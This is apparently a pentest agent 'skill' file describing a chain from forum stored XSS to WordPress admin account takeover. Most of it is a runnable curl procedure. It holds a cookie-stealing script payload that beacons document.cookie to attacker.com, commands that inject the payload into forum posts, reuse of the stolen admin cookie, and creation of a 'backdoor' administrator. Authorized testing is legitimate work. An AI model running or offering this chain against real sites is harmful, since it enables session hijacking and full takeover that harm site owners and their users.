---
name: forum-xss-wp-ato
description: Chain forum XSS → cookie theft → WordPress admin ATO
version: 1.0.0
phase: chains
category: chaining
tags: [xss, cookie-theft, wordpress, ato, forum, session]
tools: [curl, browser-devtools]
difficulty: advanced
opsec_level: high
time_estimate: 15m
severity_if_found: critical
related_skills:
  - hunt-xss
  - token-theft
  - cors-session-ato
mitre_attack:
  - T1189
  - T1539
  - T1078.004
---

## When to Use

Use this skill when a forum or community platform (bbPress, BuddyPress,
Discourse) has a stored XSS vulnerability AND shares session state with
WordPress admin. Chain XSS → cookie theft → WordPress admin session → ATO.

## Prerequisites

- curl
- Forum with stored XSS vulnerability identified
- WordPress admin session cookie accessible
- Knowledge of admin username

## Procedure

```bash
# STEP 1: Identify forum platform and XSS vector
curl -sk "https://TARGET/" | grep -oiE "bbpress|buddypress|discourse|flavor"
curl -sk "https://TARGET/forum/" | grep -oiE 'action="[^"]*"'

# STEP 2: Test stored XSS in forum post
curl -sk -X POST "https://TARGET/forum/new-topic" \
  -H "Cookie: wordpress_test_cookie=WP+Cookie+check" \
  -d "title=test&content=<img src=x onerror=alert(1)>"

# STEP 3: Craft cookie theft payload
cat > /tmp/xss-payload.txt << 'EOF'
<script>
new Image().src="https://attacker.com/steal?c="+document.cookie;
</script>
EOF

# STEP 4: Inject cookie theft via forum post
curl -sk -X POST "https://TARGET/forum/new-topic" \
  -H "Cookie: wordpress_test_cookie=WP+Cookie+check" \
  --data-urlencode "title=Welcome" \
  --data-urlencode "content=<script>new Image().src='https://attacker.com/steal?c='+document.cookie;</script>"

# STEP 5: Wait for admin to view the post, receive cookie
# On attacker: python3 -m http.server 8888
# Watch for incoming request with WordPress session cookie

# STEP 6: Use stolen cookie to hijack WordPress admin session
curl -sk -b "wordpress_logged_in_HASH=STOLEN_VALUE" \
  "https://TARGET/wp-admin/"

# STEP 7: Verify admin access
curl -sk -b "wordpress_logged_in_HASH=STOLEN_VALUE" \
  "https://TARGET/wp-admin/admin.php?page=users" | grep -i "Administrator"

# STEP 8: Take over WordPress — create admin user or upload plugin
curl -sk -b "wordpress_logged_in_HASH=STOLEN_VALUE" \
  -X POST "https://TARGET/wp-admin/user-new.php" \
  -d "user_login=backdoor&user_email=backdoor@attacker.com&user_pass=Secret123&role=administrator"
```

## OPSEC Rules

- **CRITICAL**: XSS → ATO is a severe finding — document carefully
- Do not create persistent backdoor accounts without authorization
- Remove all injected XSS payloads after assessment
- Document admin cookie theft for remediation
- Do not access data beyond proof-of-concept
- Clean up any created user accounts

## Verification

- Confirm stored XSS executes in admin's browser
- Verify stolen cookie provides admin session
- Test WordPress admin functionality with stolen session
- Confirm account takeover is complete

## Pitfalls

- HttpOnly flag on cookies prevents JavaScript theft
- Content-Security-Policy may block inline script execution
- Forum may sanitize HTML/script tags
- Admin may not view the malicious post during assessment
- WordPress may use session fingerprinting
- CSRF tokens may block state-changing requests

## Output Format

```
[CHAIN] Forum XSS → WordPress ATO chain successful
  Step 1: Stored XSS in bbPress forum post
  Step 2: Cookie theft via image tag (document.cookie)
  Step 3: WordPress admin session cookie stolen
  Step 4: Admin access confirmed (wp-admin/users)
  Step 5: Full WordPress control achieved
  Severity: CRITICAL (9.0)
```
